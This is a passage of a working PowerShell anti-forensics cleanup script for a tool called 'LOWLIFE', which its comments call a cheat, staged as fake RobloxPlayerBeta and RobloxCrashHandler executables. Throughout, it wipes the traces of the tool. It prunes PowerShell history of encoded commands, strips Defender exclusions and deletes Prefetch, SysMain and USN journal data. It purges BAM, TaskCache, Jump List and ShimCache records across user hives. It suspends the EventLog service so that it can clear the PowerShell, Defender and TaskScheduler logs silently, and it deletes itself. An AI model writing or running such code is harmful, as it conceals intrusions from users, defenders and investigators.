        $legacyFiles.Add((Join-Path $scriptRoot 'key.txt'))
        if ($storedWorkspace) {
            $legacyFiles.Add((Join-Path $storedWorkspace 'key.txt'))
            # Clean workspace logs and fallbacks
            $legacyFiles.Add((Join-Path $storedWorkspace 'installer_run.log'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'task_debug.log'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'loader_run.log'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'out.log'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'err.log'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'build\RobloxPlayerBeta.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'build\RobloxPlayerBeta_fallback.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxPlayerBeta.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxPlayerBeta.enc'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'build\RobloxCrashHandler.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'build\RobloxCrashHandler_fallback.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxCrashHandler.exe'))
            $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxCrashHandler.enc'))
        }
        # Also try relative to script root just in case
        $legacyFiles.Add((Join-Path $scriptRoot 'installer_run.log'))
        $legacyFiles.Add((Join-Path $scriptRoot 'task_debug.log'))
        $legacyFiles.Add((Join-Path $scriptRoot 'loader_run.log'))
        $legacyFiles.Add((Join-Path $scriptRoot 'out.log'))
        $legacyFiles.Add((Join-Path $scriptRoot 'err.log'))
        $legacyFiles.Add((Join-Path $scriptRoot 'build\RobloxPlayerBeta.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'build\RobloxPlayerBeta_fallback.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'updates-server\uploads\RobloxPlayerBeta.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'updates-server\uploads\RobloxPlayerBeta.enc'))
        $legacyFiles.Add((Join-Path $scriptRoot 'build\RobloxCrashHandler.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'build\RobloxCrashHandler_fallback.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'updates-server\uploads\RobloxCrashHandler.exe'))
        $legacyFiles.Add((Join-Path $scriptRoot 'updates-server\uploads\RobloxCrashHandler.enc'))
    }
    foreach ($f in $legacyFiles) {
        if (Test-Path $f) {
            Safe-DeleteFile -FilePath $f
            $cleaned += "; Deleted legacy file: $(Split-Path $f -Leaf)"
            $script:totalCleanedFiles++
        }
    }

    # 6b. Clean up PSReadLine console command history file (Multi-user)
    $historyPaths = [System.Collections.Generic.List[string]]::new()
    foreach ($pPath in $profiles) {
        $historyPaths.Add((Join-Path $pPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt"))
    }
    # Also add standard active paths just in case
    $historyPaths.Add("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt")
    $historyPaths.Add("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt")
    
    $prWipedCount = 0
    foreach ($hp in ($historyPaths | Select-Object -Unique)) {
        if (Test-Path $hp) {
            $lines = Get-Content -Path $hp -ErrorAction SilentlyContinue
            if ($lines) {
                $originalCount = $lines.Count
                
                # Gather patterns including workspace paths, URLs, and base64-encoded commands
                $patterns = @("lowlife", "RobloxPlayerBeta", "installer", "setup", "cleanup", "delta", "B332FDC6", "-[eE]n?c?o?d?e?d?[cC]o?m?m?a?n?d?", "-[eE]n?c?")
                if ($scriptRoot) { $patterns += [regex]::Escape($scriptRoot) }
                if ($storedWorkspace) { $patterns += [regex]::Escape($storedWorkspace) }
                if ($storedServerUrl) { $patterns += [regex]::Escape($storedServerUrl) }
                $regexPattern = ($patterns | ForEach-Object { $_ }) -join "|"

                # Filter out lines matching any patterns
                $filtered = $lines | Where-Object {
                    $_ -notmatch $regexPattern
                }
                if ($filtered.Count -lt $originalCount) {
                    $filtered | Out-File -FilePath $hp -Encoding utf8 -Force -ErrorAction SilentlyContinue
                    $prWipedCount += ($originalCount - $filtered.Count)
                }
            }
        }
    }
    if ($prWipedCount -gt 0) {
        $cleaned += "; Pruned $prWipedCount line(s) from PSReadLine history"
    }

    # 6c. Clean up Windows Defender Exclusions registered by installer/setup
    $defExWiped = 0
    $exclusions = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
    if ($exclusions) {
        $parentPath = if ($resolvedPath) { Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue } else { $null }
        $scriptParentPath = if ($scriptRoot) { Split-Path -Parent $scriptRoot -ErrorAction SilentlyContinue } else { $null }
        
        foreach ($ex in $exclusions) {
            if (($parentPath -and $ex -eq $parentPath) -or 
                ($resolvedPath -and $ex -eq $resolvedPath) -or
                ($scriptRoot -and $ex -eq $scriptRoot) -or
                ($scriptParentPath -and $ex -eq $scriptParentPath) -or
                $ex -like "*lowlife*" -or 
                $ex -like "*RobloxPlayerBeta*") {
                Remove-MpPreference -ExclusionPath $ex -ErrorAction SilentlyContinue
                $defExWiped++
            }
        }
    }
    if ($defExWiped -gt 0) {
        $cleaned += "; Cleaned $defExWiped Defender exclusion(s)"
    }

    if ($cleaned) { return $cleaned.TrimStart('; ') }
    return "No license key, Defender exclusions, PSReadLine history, or legacy files found"
}

# 7. Clean up Windows Prefetch (.pf) traces, SysMain databases, and NTFS USN Journal
Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and NTFS USN Journal" {
    $prefetchDir = "$env:SystemRoot\Prefetch"
    $cleanedCount = 0
    if (Test-Path $prefetchDir) {
        # 7a. Target program-specific prefetch files
        $traceKeywords = @("RobloxPlayerBeta*", "LOWLIFE*")
        $prefetchFiles = [System.Collections.Generic.List[System.IO.FileInfo]]::new()
        
        foreach ($kw in $traceKeywords) {
            $matched = Get-ChildItem -Path $prefetchDir -Filter "$kw.pf" -ErrorAction SilentlyContinue
            if ($matched) {
                $prefetchFiles.AddRange($matched)
            }
        }

        foreach ($file in $prefetchFiles) {
            Safe-DeleteFile -FilePath $file.FullName
            $cleanedCount++
        }

        # 7b. Scan all other prefetch files for embedded strings pointing to the cheat paths or names
        $keywords = @('RobloxPlayerBeta', 'RobloxCrashHandler', 'LOWLIFE', 'lowlife', 'delta', 'B332FDC6', 'setup', 'installer', 'cleanup')
        if ($scriptRoot) { $keywords += $scriptRoot }
        if ($storedWorkspace) { $keywords += $storedWorkspace }

        $allPfFiles = Get-ChildItem -Path $prefetchDir -Filter '*.pf' -ErrorAction SilentlyContinue
        foreach ($file in $allPfFiles) {
            # Skip if already deleted
            if (-not (Test-Path $file.FullName)) { continue }
            try {
                $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $matched = $false
                foreach ($kw in $keywords) {
                    $asciiBytes = [System.Text.Encoding]::ASCII.GetBytes($kw)
                    $unicodeBytes = [System.Text.Encoding]::Unicode.GetBytes($kw)
                    
                    # Check ASCII
                    for ($i = 0; $i -le ($bytes.Length - $asciiBytes.Length); $i++) {
                        $match = $true
                        for ($j = 0; $j -lt $asciiBytes.Length; $j++) {
                            if ($bytes[$i+$j] -ne $asciiBytes[$j]) { $match = $false; break }
                        }
                        if ($match) { $matched = $true; break }
                    }
                    if ($match) { break }
                    
                    # Check Unicode
                    for ($i = 0; $i -le ($bytes.Length - $unicodeBytes.Length); $i++) {
                        $match = $true
                        for ($j = 0; $j -lt $unicodeBytes.Length; $j++) {
                            if ($bytes[$i+$j] -ne $unicodeBytes[$j]) { $match = $false; break }
                        }
                        if ($match) { $matched = $true; break }
                    }
                    if ($match) { break }
                }
                if ($matched) {
                    Safe-DeleteFile -FilePath $file.FullName
                    $cleanedCount++
                }
            } catch {}
        }

        # 7c. Clean Layout.ini
        $layoutPath = Join-Path $prefetchDir "Layout.ini"
        if (Test-Path $layoutPath) {
            $lines = Get-Content -Path $layoutPath -Encoding Unicode -ErrorAction SilentlyContinue
            if ($lines) {
                $filtered = $lines | Where-Object { 
                    $_ -notmatch "RobloxPlayerBeta" -and 
                    $_ -notmatch "LOWLIFE" -and 
                    $_ -notmatch "lowlife" -and
                    $_ -notmatch "delta" -and
                    $_ -notmatch "B332FDC6" -and
                    $_ -notmatch "setup" -and
                    $_ -notmatch "installer" -and
                    $_ -notmatch "cleanup"
                }
                $filtered | Out-File -FilePath $layoutPath -Encoding Unicode -Force -ErrorAction SilentlyContinue
            }
        }

        # 7d. Clean SuperFetch / SysMain Databases (Ag*.db files)
        $sysmainService = Get-Service -Name "SysMain" -ErrorAction SilentlyContinue
        $wasRunning = $false
        if ($sysmainService -and $sysmainService.Status -eq 'Running') {
            $wasRunning = $true
            Stop-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue | Out-Null
            for ($i = 0; $i -lt 10; $i++) {
                $status = (Get-Service -Name "SysMain" -ErrorAction SilentlyContinue).Status
                if ($status -eq 'Stopped') { break }
                Start-Sleep -Seconds 1
            }
        }

        $dbFiles = Get-ChildItem -Path $prefetchDir -Filter "Ag*.db" -ErrorAction SilentlyContinue
        foreach ($db in $dbFiles) {
            Safe-DeleteFile -FilePath $db.FullName
            $cleanedCount++
        }

        if ($wasRunning) {
            Start-Service -Name "SysMain" -ErrorAction SilentlyContinue | Out-Null
        }
    }

    # 7e. Clear NTFS Change Journal (USN Journal) for all connected NTFS drives
    $volumes = Get-Volume -ErrorAction SilentlyContinue
    foreach ($vol in $volumes) {
        if ($vol.FileSystem -eq "NTFS" -and $vol.DriveLetter) {
            $driveStr = "$($vol.DriveLetter):"
            cmd.exe /c "fsutil usn deletejournal /D $driveStr" | Out-Null
        }
    }

    $script:totalCleanedFiles += $cleanedCount
    return "Wiped $cleanedCount prefetch files/databases, sanitized Layout.ini, and cleared NTFS USN Journal"
}

# 8. Clean up Registry references and user activity residues (MuiCache, UserAssist, BAM, Task Cache, AppCompatFlags, ComDlg32, RunMRU, Recent Shortcuts)
Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut residues" {
    $cleanedKeysCount = 0
    $recentWiped = 0
    $jumpWiped = 0
    
    # 8a. Delete Software keys if they exist (Targeted only)
    # HKLM-wide (system-wide) LOWLIFE key
    $hklmLowlife = "HKLM:\Software\LOWLIFE"
    if (Test-Path $hklmLowlife) {
        Remove-Item -Path $hklmLowlife -Recurse -Force -ErrorAction SilentlyContinue
        $cleanedKeysCount++
    }
    
    # Also clean up dynamically created Software keys matching the pattern under HKLM
    $hklmSoftwareBase = "HKLM:\Software"
    if (Test-Path $hklmSoftwareBase) {
        $matchedKeys = Get-ChildItem -Path $hklmSoftwareBase -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
        foreach ($mk in $matchedKeys) {
            Remove-Item -Path $mk.PsPath -Recurse -Force -ErrorAction SilentlyContinue
            $cleanedKeysCount++
        }
    }

    # 8b. Clean loaded user hives and current user hive
    Clean-RegistryHive -BasePath "HKCU:" -CleanedKeysCount ([ref]$cleanedKeysCount)
    
    $loadedSids = Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSChildName -match '^S-1-5-21-\d+-\d+-\d+-\d+$' }
    foreach ($sid in $loadedSids) {
        Clean-RegistryHive -BasePath "Registry::HKEY_USERS\$($sid.PSChildName)" -CleanedKeysCount ([ref]$cleanedKeysCount)
    }

    # 8c. Clean registry for offline users by loading their hives
    $profiles = Get-UserProfilePaths
    foreach ($pPath in $profiles) {
        $username = Split-Path $pPath -Leaf
        $ntuserPath = Join-Path $pPath "NTUSER.DAT"
        if (Test-Path $ntuserPath) {
            $tempHiveName = "TempHive_$username"
            $loadResult = cmd.exe /c "reg load HKU\$tempHiveName `"$ntuserPath`"" 2>&1
            if ($LASTEXITCODE -eq 0) {
                try {
                    Clean-RegistryHive -BasePath "Registry::HKEY_USERS\$tempHiveName" -CleanedKeysCount ([ref]$cleanedKeysCount)
                } finally {
                    [System.GC]::Collect()
                    [System.GC]::WaitForPendingFinalizers()
                    Start-Sleep -Seconds 1
                    cmd.exe /c "reg unload HKU\$tempHiveName" | Out-Null
                }
            }
        }
        
        # Load UsrClass.dat for classes keys
        $usrClassPath = Join-Path $pPath "AppData\Local\Microsoft\Windows\UsrClass.dat"
        if (Test-Path $usrClassPath) {
            $tempHiveName = "TempHiveClass_$username"
            $loadResult = cmd.exe /c "reg load HKU\$tempHiveName `"$usrClassPath`"" 2>&1
            if ($LASTEXITCODE -eq 0) {
                try {
                    Clean-RegistryHive -BasePath "Registry::HKEY_USERS\$tempHiveName" -CleanedKeysCount ([ref]$cleanedKeysCount)
                } finally {
                    [System.GC]::Collect()
                    [System.GC]::WaitForPendingFinalizers()
                    Start-Sleep -Seconds 1
                    cmd.exe /c "reg unload HKU\$tempHiveName" | Out-Null
                }
            }
        }
    }

    # 8d. Target BAM (Background Activity Monitor) tracking entries (Granular path deletion)
    $bamPaths = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings",
        "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    )
    foreach ($basePath in $bamPaths) {
        if (Test-Path $basePath) {
            $userSids = Get-ChildItem -Path $basePath -ErrorAction SilentlyContinue
            foreach ($sid in $userSids) {
                $sidKey = Get-Item -Path $sid.PsPath -ErrorAction SilentlyContinue
                if ($sidKey) {
                    $values = $sidKey.GetValueNames()
                    foreach ($val in $values) {
                        if ($val -like "*RobloxPlayerBeta*" -or $val -like "*LOWLIFE*" -or $val -like "*delta*" -or $val -like "*B332FDC6*" -or $val -like "*setup*" -or $val -like "*installer*" -or $val -like "*cleanup*") {
                            $sidKey.DeleteValue($val)
                            $cleanedKeysCount++
                        }
                    }
                }
            }
        }
    }

    # 8e. Clean residual Task Cache keys if schtasks left any (Tasks, Tree, Logon, Boot, Maintenance)
    $taskTreeBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
    if (Test-Path $taskTreeBase) {
        $taskKeys = Get-ChildItem -Path $taskTreeBase -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*RobloxPlayerBeta*" -or $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
        foreach ($tk in $taskKeys) {
            # Extract task GUID if present to clean Tasks and Triggers cache
            $taskId = (Get-ItemProperty -Path $tk.PsPath -Name "Id" -ErrorAction SilentlyContinue).Id
            if ($taskId) {
                $cachePaths = @(
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$taskId",
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\$taskId",
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\$taskId",
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\$taskId"
                )
                foreach ($cp in $cachePaths) {
                    if (Test-Path $cp) {
                        Remove-Item -Path $cp -Recurse -Force -ErrorAction SilentlyContinue
                        $cleanedKeysCount++
                    }
                }
            }
            Remove-Item -Path $tk.PsPath -Recurse -Force -ErrorAction SilentlyContinue
            $cleanedKeysCount++
        }
    }

    # 8f. Clean Recent Shortcuts Folder (.lnk files) using COM Target Path Resolution
    $shObj = New-Object -ComObject WScript.Shell
    foreach ($pPath in $profiles) {
        $recentPath = Join-Path $pPath "AppData\Roaming\Microsoft\Windows\Recent"
        if (Test-Path $recentPath) {
            $lnkFiles = Get-ChildItem -Path $recentPath -Filter "*.lnk" -ErrorAction SilentlyContinue
            foreach ($lnk in $lnkFiles) {
                $deleteLnk = $false
                if ($lnk.Name -like "*lowlife*" -or $lnk.Name -like "*RobloxPlayerBeta*" -or $lnk.Name -like "*setup*" -or $lnk.Name -like "*installer*" -or $lnk.Name -like "*cleanup*") {
                    $deleteLnk = $true
                } else {
                    try {
                        $target = $shObj.CreateShortcut($lnk.FullName).TargetPath
                        if ($target -and ($target -like "*lowlife*" -or $target -like "*RobloxPlayerBeta*" -or $target -like "*delta*" -or $target -like "*B332FDC6*" -or $target -like "*setup*" -or $target -like "*installer*" -or $target -like "*cleanup*")) {
                            $deleteLnk = $true
                        }
                    } catch {}
                }
                if ($deleteLnk) {
                    Safe-DeleteFile -FilePath $lnk.FullName
                    $recentWiped++
                }
            }
        }
    }
    
    # 8g. Clean Startup shortcuts (System-wide and current user)
    $startupShortcuts = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.url",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.lnk",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LaunchLowLife.bat",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\LowLifePortal.url",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\LowLifePortal.lnk",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\LaunchLowLife.bat"
    )
    foreach ($sShortcut in $startupShortcuts) {
        if (Test-Path $sShortcut) {
            Safe-DeleteFile -FilePath $sShortcut
        }
    }
    $tempExe2 = Join-Path ([System.IO.Path]::GetTempPath()) "RobloxPlayerBeta.exe"
    if (Test-Path $tempExe2) {
        Safe-DeleteFile -FilePath $tempExe2
    }
    $tempExe3 = Join-Path ([System.IO.Path]::GetTempPath()) "RobloxCrashHandler.exe"
    if (Test-Path $tempExe3) {
        Safe-DeleteFile -FilePath $tempExe3
    }

    # 8h. Clean Jump Lists for all users (OLE destinations parsing)
    $jumpKeywords = @("lowlife", "RobloxPlayerBeta", "RobloxCrashHandler", "setup", "installer", "cleanup", "delta", "B332FDC6")
    foreach ($pPath in $profiles) {
        $jumpDirs = @(
            Join-Path $pPath "AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations",
            Join-Path $pPath "AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations"
        )
        foreach ($jd in $jumpDirs) {
            if (Test-Path $jd) {
                $jFiles = Get-ChildItem -Path $jd -File -ErrorAction SilentlyContinue
                foreach ($jf in $jFiles) {
                    if (Test-Path $jf.FullName) {
                        try {
                            $bytes = [System.IO.File]::ReadAllBytes($jf.FullName)
                            $matched = $false
                            foreach ($kw in $jumpKeywords) {
                                $asciiBytes = [System.Text.Encoding]::ASCII.GetBytes($kw)
                                $unicodeBytes = [System.Text.Encoding]::Unicode.GetBytes($kw)
                                
                                # Check ASCII
                                for ($i = 0; $i -le ($bytes.Length - $asciiBytes.Length); $i++) {
                                    $match = $true
                                    for ($j = 0; $j -lt $asciiBytes.Length; $j++) {
                                        if ($bytes[$i+$j] -ne $asciiBytes[$j]) { $match = $false; break }
                                    }
                                    if ($match) { $matched = $true; break }
                                }
                                if ($matched) { break }
                                
                                # Check Unicode
                                for ($i = 0; $i -le ($bytes.Length - $unicodeBytes.Length); $i++) {
                                    $match = $true
                                    for ($j = 0; $j -lt $unicodeBytes.Length; $j++) {
                                        if ($bytes[$i+$j] -ne $unicodeBytes[$j]) { $match = $false; break }
                                    }
                                    if ($match) { $matched = $true; break }
                                }
                                if ($matched) { break }
                            }
                            if ($matched) {
                                Safe-DeleteFile -FilePath $jf.FullName
                                $jumpWiped++
                            }
                        } catch {}
                    }
                }
            }
        }
    }

    # 8i. Flush ShimCache (AppCompatCache)
    try {
        rundll32.exe apphelp.dll,ShimFlushCache
    } catch {}

    $script:totalCleanedFiles += ($recentWiped + $jumpWiped)
    $script:totalCleanedKeys += $cleanedKeysCount
    return "Removed $cleanedKeysCount registry entry/entries, $recentWiped recent shortcut(s), and $jumpWiped Jump List(s)"
}

} finally {
    # 9. Clear Trace Logs & Restore Event Log Service
    Run-CleanupStep "9/9: Clearing Trace Logs & Restoring Event Log Channels & Service" {
        # 9a. Resume the EventLog service first, so we can communicate with it to clear logs
        if ($suspendedLogPid) {
            Resume-EventLogService -ProcessId $suspendedLogPid
        }

        # 9b. Clear the specific operational event logs while their channels are still disabled.
        # Since the channels are disabled, the EventLog service will not write a "clear log" event (Event 104) to them.
        $targetLogs = @(
            "Microsoft-Windows-PowerShell/Operational", 
            "Windows PowerShell",
            "PowerShellCore/Operational",
            "Microsoft-Windows-TaskScheduler/Operational",
            "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
            "Microsoft-Windows-Windows Defender/Operational",
            "Microsoft-Windows-Windows Defender/WHC",
            "Microsoft-Windows-Application-Experience/Program-Telemetry",
            "Microsoft-Windows-Application-Experience/Program-Inventory",
            "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant",
            "Microsoft-Windows-WMI-Activity/Operational"
        )
        
        $wipedCount = 0
        $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
        foreach ($log in $targetLogs) {
            try {
                # Always clear the logs to ensure no trace (including Base64 encoded commands or historical logs) remains
                $session.ClearLog($log)
                $wipedCount++
            } catch {
                # Log might be empty, disabled, or locked, skip gracefully
            }
        }
        $script:totalCleanedLogs += $wipedCount

        # 9c. Re-enable event log channels now that they are clean
        $restoredCount = 0
        foreach ($chan in $targetLogs) {
            try {
                wevtutil.exe sl $chan /e:true 2>$null
                $restoredCount++
            } catch {}
        }
        
        return "Stealth cleared $wipedCount operational trace log(s) and restored $restoredCount event log channel(s)"
    }
}

# Generate and save permanent audit performance log
$logPath = Join-Path $env:TEMP "lowlife_cleanup_perf.log"
if ($FullUninstall -or $NoAuditLog) {
    if (Test-Path $logPath) {
        Safe-DeleteFile -FilePath $logPath
    }
} else {
    $logContent = [System.Text.StringBuilder]::new()
    [void]$logContent.AppendLine("======================================================================")
    [void]$logContent.AppendLine("LOWLIFE CLEANUP SYSTEM PERFORMANCE AUDIT LOG")
    [void]$logContent.AppendLine("Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
    [void]$logContent.AppendLine("User: $env:USERNAME")
    [void]$logContent.AppendLine("OS Version: $((Get-WmiObject Win32_OperatingSystem).Caption)")
    [void]$logContent.AppendLine("======================================================================")
    $formattedTable = $perfStats | Format-Table -AutoSize | Out-String
    [void]$logContent.AppendLine($formattedTable)
    [void]$logContent.AppendLine("Summary:")
    [void]$logContent.AppendLine("  Total Files Deleted:         $totalCleanedFiles")
    [void]$logContent.AppendLine("  Total Registry Keys Cleaned: $totalCleanedKeys")
    [void]$logContent.AppendLine("  Total Logs Cleared:          $totalCleanedLogs")
    [void]$logContent.AppendLine("  Total Execution:             $totalDurationMs ms")
    [void]$logContent.AppendLine("======================================================================")
    $logContent.ToString() | Out-File -FilePath $logPath -Encoding utf8 -Force
}

# Visual summary dashboard
Write-Host "==========================================================" -ForegroundColor Green
Write-Host " SUCCESS: Environment has been fully optimized & cleaned!" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Host "                     CLEANER PERFORMANCE REPORT           " -ForegroundColor Cyan
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Format-Table -InputObject $perfStats -AutoSize | Out-String | Write-Host -ForegroundColor White
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Total Files Cleaned:         $totalCleanedFiles" -ForegroundColor Yellow
Write-Host "  Total Registry Keys Cleaned: $totalCleanedKeys" -ForegroundColor Yellow
Write-Host "  Total Trace Logs Wiped:      $totalCleanedLogs" -ForegroundColor Yellow
Write-Host "  Total Cleanup Duration:      $totalDurationMs ms (FAST)" -ForegroundColor Green
Write-Host "  Performance Audit Log:       $logPath" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Green

# If running as the temporary cleanup file, spawn a background command to delete it after exit
if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
    Start-Process cmd.exe -ArgumentList "/c timeout /t 2 & del `"$PSCommandPath`"" -WindowStyle Hidden
}
